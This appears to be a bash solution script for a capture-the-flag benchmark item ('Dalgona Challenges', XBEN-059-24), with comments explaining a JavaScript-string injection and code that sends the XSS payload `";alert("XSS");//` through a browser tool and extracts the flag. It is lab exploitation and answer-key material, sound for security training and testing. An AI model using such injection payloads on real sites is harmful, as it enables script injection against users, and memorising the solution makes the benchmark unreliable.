#!/usr/bin/env bash
# XBEN-059-24 — "Dalgona Challenges", circle (tags: xss)
#
# The parameter is written into JavaScript rather than into HTML: `var name =
# "…";`. There is no HTML to escape from and no tag to open. Closing the string
# literal puts the rest of the parameter in statement position, and `//` comments
# out the remains of the line the server wrote.
#
# The only thing on the blacklist is `import`.
#
# The server renders the page, loads its own rendering in PhantomJS and prints
# the flag when a dialog fires with the message "XSS".
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/page" --session "$SESSION" --new --capture >/dev/null
seq="$("$H5I" websec replay req_0 --create --set 'query.name=";alert("XSS");//' \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
